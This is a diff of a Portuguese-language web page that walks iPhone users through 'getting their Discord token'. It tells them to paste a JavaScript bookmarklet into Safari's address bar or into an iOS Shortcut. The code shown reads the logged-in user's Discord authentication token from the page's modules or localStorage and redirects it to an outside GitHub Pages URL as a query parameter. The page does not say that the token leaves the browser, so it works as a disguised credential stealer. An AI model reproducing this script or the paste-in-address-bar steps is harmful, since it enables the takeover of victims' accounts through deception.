@@ -21,40 +21,50 @@
             <p class="subtitle">A solução definitiva para pegar seu Token no iPhone sem complicação.</p>
         </header>
 
-        <section class="solution-card">
+        <section class="mode-selector">
+            <!-- CARD MODO PRO: ATALHO iOS -->
+            <div class="card-glass pro-card">
+                <div class="pro-badge">MODO TURBO</div>
+                <h2>🚀 Atalho 1-Clique (iOS)</h2>
+                <p>A forma mais rápida. Adicione um botão ao seu menu de compartilhar do Safari.</p>
+                
+                <div class="steps-compact">
+                    <p>1. Copie o <strong>Script Pro</strong> abaixo.</p>
+                    <p>2. No App <strong>Atalhos</strong>, crie um novo atalho.</p>
+                    <p>3. Adicione a ação <strong>"Executar JavaScript"</strong> e cole.</p>
+                </div>
+
+                <div class="action-grid">
+                    <button id="copyShortcutBtn" class="premium-btn gold">COPIAR SCRIPT PRO</button>
+                </div>
+            </div>
+
+            <!-- CARD REDIRECIONAMENTO -->
             <div class="card-glass">
-                <h2>🚀 Modo Rápido (Recomendado)</h2>
+                <h2>⚡ Modo Rápido (Web)</h2>
                 <div class="automation-zone">
-                    <p>Clique no botão abaixo para copiar o código e ir para o Discord.</p>
+                    <p>Copia o código e abre o Discord em uma nova aba.</p>
                     <button id="magicBtn" class="premium-btn large">COPIAR & ABRIR DISCORD</button>
                 </div>
                 
-                <hr class="divider">
+                <div class="divider">ou</div>
 
                 <h2>📱 Tutorial Detalhado</h2>
                 <div class="steps">
                     <div class="step">
                         <span class="step-number">01</span>
-                        <p>Copie o código abaixo clicando no botão azul.</p>
+                        <p>No Safari, toque no <strong>"AA"</strong> e selecione <strong>"Versão para Computador"</strong>.</p>
                     </div>
                     <div class="step">
                         <span class="step-number">02</span>
-                        <p>No Safari, toque no <strong>"AA"</strong> e selecione <strong>"Versão para Computador"</strong>. Depois entre em <strong>Discord.com</strong> e faça login.</p>
-                    </div>
-                    <div class="step">
-                        <span class="step-number">03</span>
-                        <p>Na barra de endereços, apague tudo o que estiver lá.</p>
-                    </div>
-                    <div class="step">
-                        <span class="step-number">04</span>
-                        <p>Digite <code>javascript:</code> e então <strong>COLE</strong> o código que você copiou.</p>
+                        <p>Digite <code>javascript:</code> na barra e então **COLE** o código.</p>
                     </div>
                 </div>
 
                 <div class="code-box">
                     <div class="code-header">
                         <span>Código do Bookmarklet</span>
-                        <button id="copyBtn" class="premium-btn small">COPIAR CÓDIGO</button>
+                        <button id="copyBtn" class="premium-btn small">COPIAR</button>
                     </div>
                     <pre><code id="bookmarkletCode">(function(){let t=(webpackChunkdiscord_app.push([[''],{},e=>{for(let c in e.c)if(e.c[c].exports?.default?.getToken)t=e.c[c].exports.default.getToken();for(let a in e.c[c].exports)if(e.c[c].exports?.[a]?.getToken&&e.c[c].exports[a][Symbol.toStringTag]!=="IntlMessagesProxy")t=e.c[c].exports[a].getToken()}] )||window.localStorage.getItem('token')||window.localStorage.getItem('__auth_token')).replace(/"/g,'');if(t&&t!=='undefined'){window.location.href='https://enzo695.github.io/token-/result.html?token='+t}else{alert('Token não encontrado! Certifique-se de estar logado no site do Discord.')};})();</code></pre>
                 </div>
